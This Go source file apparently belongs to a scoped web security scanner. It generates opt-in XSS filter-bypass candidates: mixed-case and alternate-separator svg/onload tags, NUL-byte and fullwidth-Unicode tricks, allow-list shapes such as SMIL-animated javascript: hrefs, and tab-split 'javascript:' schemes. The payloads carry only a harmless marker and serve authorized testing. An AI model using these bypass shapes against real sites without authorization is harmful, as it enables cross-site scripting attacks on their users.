package detection

// This file is the OPT-IN WAF/filter-bypass candidate generator.
//
// It covers two filter classes, both deliberately small and deterministic:
//
//   - REWRITING bypasses, which reshape a canonical breakout to survive a
//     naive matcher (case-sensitive string/regex matching, literal-space-only
//     tokenizing, single-layer URL decoding, ...).
//   - ALLOW-LIST bypasses, where the filter admits only a fixed set of tag
//     names and event-handler attributes, so no reshaping of a blocked tag can
//     help — the only construct that survives is the one the allow-list was
//     written to keep (body/onresize, custom elements+onfocus, an SVG SMIL
//     animatetransform's onbegin; see "Filter-allow-list shapes" in
//     docs/reflection-candidates.md).
//
// Everything here still embeds nothing but the same benign marker as every
// other candidate (TestEvasionCandidatesAreBenignMarkers enforces this exactly
// like TestPlanCandidatesAreBenignMarkers does for the canonical set: no alert/
// cookie/exfiltration construct is ever generated here either).
//
// Gating: PlanCandidates only calls evasionTemplatesFor when the caller sets
// PlanOptions.EnableEvasion — itself only ever true when the OPERATOR set
// domain.ScanConfig.EnableEvasion for that scan (off by default). This is a
// deliberate per-engagement opt-in (AGENTS.md §2.3: "aggressive behavior is
// opt-in and operator-configured"), not default behavior — bypass testing is
// appropriate for an authorized engagement where a WAF/filter bypass is
// itself the reportable finding (e.g. many bug bounty programs), and
// inappropriate as something Indago does silently by default.
//
// Boundary that does NOT move: every evasion candidate is still sent through
// the exact same scope-enforcing engine as every other request (internal/
// scan's scopedEngine), still rate-limited and concurrency-capped by the
// scan's profile, and still only ever replayed into the SAME injection point
// the candidate step already tested — this widens the request SHAPES tried
// against an in-scope target, it never widens WHAT may be targeted, how
// fast, or how many times. It is also still just a detection probe: nothing
// here does request-fingerprint spoofing, IP/proxy rotation, timing jitter,
// or CAPTCHA handling — that class of evasion needs infrastructure this
// local, single-process scanner does not have and is NOT in scope here.
//
// Candidate.Technique names which bypass shape produced a given candidate
// (see the Technique field's doc comment) so a report can show an operator
// exactly which filter shape got past the target — the actual intel a bug
// bounty report needs to describe the bypass.

// evasionTemplatesFor returns the opt-in bypass variants for a site's
// context, ADDITIONAL TO (never instead of) templatesFor's canonical set.
// Contexts with no established bypass shape return nil.
func evasionTemplatesFor(a ContextAnalysis, m string) []candTemplate {
	switch categoryOf(a.Context) {
	case CatHTMLText:
		return htmlTextEvasionTemplates(a, m)
	case CatHTMLAttr:
		return htmlAttrEvasionTemplates(a, m)
	case CatCSS:
		return cssEvasionTemplates(a, m)
	case CatURL:
		return urlEvasionTemplates(a, m)
	case CatJS:
		return jsEvasionTemplates(a, m)
	default:
		return nil
	}
}

// evasionTpl builds a load-trigger evasion template tagged with technique.
// The generic techniques reshape a LOAD-trigger canonical breakout because only
// a load-trigger candidate can ever be Confirmed by the passive verifier — an
// evasion variant of an interaction-only shape would be untestable the same way
// the canonical one already is.
func evasionTpl(value, needs string, priority int, why, technique string) candTemplate {
	return evasionTplTrigger(value, needs, priority, why, technique, TriggerLoad)
}

// evasionTplTrigger is evasionTpl with an explicit trigger class, for the one
// allow-list shape whose event the passive verifier deliberately never
// synthesizes (see the body/onresize template below).
func evasionTplTrigger(value, needs string, priority int, why, technique, trigger string) candTemplate {
	return candTemplate{value: value, needs: needs, priority: priority, rationale: why, trigger: trigger, technique: technique}
}

func htmlTextEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
	prefix := ""
	switch {
	case a.Context == CtxHTMLComment:
		prefix = "-->"
	case a.Sub == "rcdata" || a.Sub == "rawtext" || a.Sub == "rawtext_noscript":
		if a.Element != "" {
			prefix = "</" + a.Element + ">"
		}
	}
	return []candTemplate{
		evasionTpl(prefix+"<SvG OnLoad="+m+">", "<>", 50,
			prefixReason(prefix, "mixed-case tag and attribute name — bypasses a filter that only matches the lowercase literal \"<svg\"/\"onload\""),
			"case_variation"),
		evasionTpl(prefix+"<svg/onload="+m+">", "<>", 48,
			prefixReason(prefix, "'/' in place of the space before the attribute — valid HTML5 (the tokenizer treats it as attribute-boundary whitespace here), which a filter expecting a literal space may miss"),
			"alt_separator"),
		evasionTpl(prefix+"<svg\tonload="+m+">", "<>", 46,
			prefixReason(prefix, "a tab in place of the space before the attribute — HTML treats it as equivalent whitespace"),
			"alt_separator"),
		evasionTpl(prefix+"%3Csvg%20onload%3D"+m+"%3E", "", 15,
			prefixReason(prefix, "percent-encoded breakout characters — the transport encodes this value AGAIN on the wire, so it only survives a target that decodes twice (e.g. a WAF that decodes once to inspect, then an app that decodes once more); opportunistic, not reliable"),
			"double_url_encoding"),
		evasionTpl("\x00"+prefix+"<svg onload="+m+">", "<>", 25,
			prefixReason(prefix, "a leading NUL byte — some older/naive filters implemented in C-derived string functions (strcmp/regex engines that treat NUL as a terminator) stop matching at the NUL and never see the breakout that follows, while the browser's own HTML tokenizer does not treat NUL specially here and keeps parsing; many modern stacks strip NUL bytes before this point, so this is opportunistic, not reliable"),
			"null_byte"),
		evasionTpl(prefix+"\uff1csvg onload="+m+"\uff1e", "", 12,
			prefixReason(prefix, "fullwidth Unicode angle brackets (U+FF1C/U+FF1E) instead of ASCII '<'/'>' — invisible to a filter matching the ASCII literal, and only becomes a real breakout if the target itself Unicode-normalizes (NFKC) the value back to ASCII before storing/rendering it; opportunistic, depends entirely on target-side normalization"),
			"unicode_fullwidth"),

		// The three "allow-list" shapes below are a different class from the
		// rewriting techniques above: the target's filter does not try to match
		// obfuscated variants at all, it admits only a tiny, fixed set of tag
		// names and event-handler attributes. Reshaping <svg onload> cannot
		// help there — the TAG is blocked — so the only bypass is the one
		// construct the allow-list was written to keep. These are still just
		// benign-marker markup: nothing runs until the browser dispatches the
		// named event, and the handler body is the bare marker (a
		// ReferenceError, never alert/cookie/exfiltration). See
		// docs/reflection-candidates.md, "Filter-allow-list shapes".
		evasionTplTrigger(prefix+"<body onresize="+m+">", "<>", 44,
			prefixReason(prefix, "the allow-list admits only the body tag and the onresize handler, so this is the one construct that survives: the parser merges the second body start tag's attributes onto the page's real <body>, and the marker handler fires when the viewport is resized"),
			"allowlisted_tag_event", TriggerInteraction),
		evasionTpl(prefix+"<x-"+m+" autofocus tabindex=1 onfocus="+m+"></x-"+m+">", "<>", 42,
			prefixReason(prefix, "the allow-list blocks every standard tag but admits custom/unknown elements: a custom element with tabindex is focusable, and autofocus makes the browser focus it during page load, firing onfocus (no click or hover needed)"),
			"custom_element_focus"),
		evasionTpl(prefix+"<svg><animatetransform onbegin="+m+" attributeName=transform></svg>", "<>", 40,
			prefixReason(prefix, "the allow-list admits only some SVG markup — here <svg> and <animatetransform>, while blocking <svg onload> and <animate> — and SMIL's begin event fires when the animation starts (default begin=\"0s\", i.e. immediately), so onbegin references the marker on load"),
			"svg_smil_begin"),
		// Measured on PortSwigger lab 11: every event handler and every anchor
		// href attribute is rejected, but SMIL <animate attributeName=href> is
		// admitted. The animation writes the javascript: URL into the anchor's
		// href after parsing, so no href attribute and no on* attribute is ever
		// sent; the click a victim performs on the link is what runs it. The
		// marker appears twice on purpose: once as the code the URL will run,
		// and once as the anchor's own text, because that text is the element
		// the verifier's click activation targets (it clicks the smallest
		// marker-carrying element, and a click on the text bubbles to the
		// anchor whose default action follows the animated href).
		evasionTplTrigger(prefix+"<svg><a><animate attributeName=href values=javascript:"+m+" /><text x=20 y=20>"+m+"</text></a></svg>", "<>", 38,
			prefixReason(prefix, "the allow-list rejects every on* handler and every href attribute, but admits SMIL: <animate attributeName=href values=javascript:MARKER> writes the URL into the anchor's href after parsing, so the construct carries no href and no handler at all, and one click on the link runs it"),
			"smil_href_animation", TriggerInteraction),
	}
}

func htmlAttrEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
	var q, needs string
	switch a.Quote {
	case "double":
		q, needs = `"`, `"`
	case "single":
		q, needs = `'`, `'`
	default:
		q, needs = "", ""
	}
	breakoutNeeds := needs + "<>"
	return []candTemplate{
		evasionTpl(q+"><SvG OnLoad="+m+">", breakoutNeeds, 50,
			"break out of the attribute and tag with a mixed-case element/handler name, bypassing a case-sensitive filter",
			"case_variation"),
		evasionTpl(q+"><svg/onload="+m+">", breakoutNeeds, 48,
			"break out of the attribute and tag, using '/' instead of a space before the attribute",
			"alt_separator"),
		evasionTpl("\x00"+q+"><svg onload="+m+">", breakoutNeeds, 24,
			"a leading NUL byte ahead of the breakout — some naive, C-derived filter implementations stop matching at the NUL while the browser's HTML tokenizer keeps going; opportunistic, many stacks strip NUL before this point",
			"null_byte"),
		evasionTpl(q+"\uff1e\uff1csvg onload="+m+"\uff1e", breakoutNeeds, 11,
			"fullwidth Unicode angle brackets (U+FF1C/U+FF1E) in place of ASCII '<'/'>' — invisible to an ASCII-literal filter; only a real breakout if the target Unicode-normalizes (NFKC) the value back to ASCII before storing/rendering; opportunistic",
			"unicode_fullwidth"),
	}
}

func cssEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
	if a.ConstructKind != "style_body" {
		return nil
	}
	return []candTemplate{
		evasionTpl("</StYle><svg onload="+m+">", "<>", 45,
			"mixed-case closing tag — bypasses a filter matching only the lowercase literal \"</style>\"",
			"case_variation"),
	}
}

// urlEvasionTemplates targets the single most commonly filtered URL-category
// construct: the javascript: scheme on an href/action/formaction-style sink.
// Many filters block it by a literal, case-sensitive substring match on
// "javascript:" — but per the WHATWG URL spec, a browser strips ASCII tab
// and newline characters from a URL string BEFORE parsing its scheme, so
// "java	script:" and "javascript:" parse identically. This is a real,
// well-documented bypass, not theoretical obfuscation.
func urlEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
	if a.Sub != "start" && a.Sub != "relative_first_segment" {
		return nil
	}
	return []candTemplate{
		evasionTpl("java\tscript:"+m, "", 40,
			"a tab inside the scheme name — the URL parser strips ASCII tab/newline from the whole URL before parsing it, so this parses identically to a plain javascript: URI, bypassing a filter doing a literal substring match on \"javascript:\"",
			"alt_separator"),
		evasionTpl("java\nscript:"+m, "", 38,
			"a newline inside the scheme name — stripped by the URL parser the same way a tab is; bypasses the same literal-substring filters",
			"alt_separator"),
		evasionTpl("JaVaScRiPt:"+m, "", 36,
			"mixed-case scheme name — URL schemes are case-insensitive to the browser, but bypasses a filter that only matches the lowercase literal \"javascript:\"",
			"case_variation"),
	}
}

// jsEvasionTemplates targets the JS-category shapes most likely to face
// a naive filter: a quoted-string breakout, and a line-comment breakout.
//
// The SINGLE-quoted leading-backslash shape (`\';M//`) is deliberately NOT
// here: a server that backslash-escapes the quote is ordinary application
// behaviour, not a filter bypass, and that shape is now a canonical candidate
// (jsTemplates) so every scan tries it without an opt-in. It is still the
// escaped_quote_prefix technique for DOUBLE-quoted strings, where the reader
// has no canonical reason to escape that quote.
func jsEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
	switch {
	case a.Context == CtxJSString && a.Sub == "double_quoted":
		return []candTemplate{
			evasionTpl(`\";`+m+"//", `"`, 30,
				"a leading backslash ahead of the breakout quote — defeats a filter that naively single-pass-escapes quotes by prefixing them with a backslash, the same addslashes()-style bypass as the single-quoted case",
				"escaped_quote_prefix"),
		}
	case a.Context == CtxJSComment && a.Sub != "block":
		return []candTemplate{
			evasionTpl("\u2028"+m, "", 18,
				"U+2028 LINE SEPARATOR instead of a literal newline — the ECMAScript spec treats it as an equivalent line terminator ending a line comment, but a filter that only strips/blocks the ASCII \"\\n\" byte misses it",
				"unicode_line_separator"),
		}
	default:
		return nil
	}
}
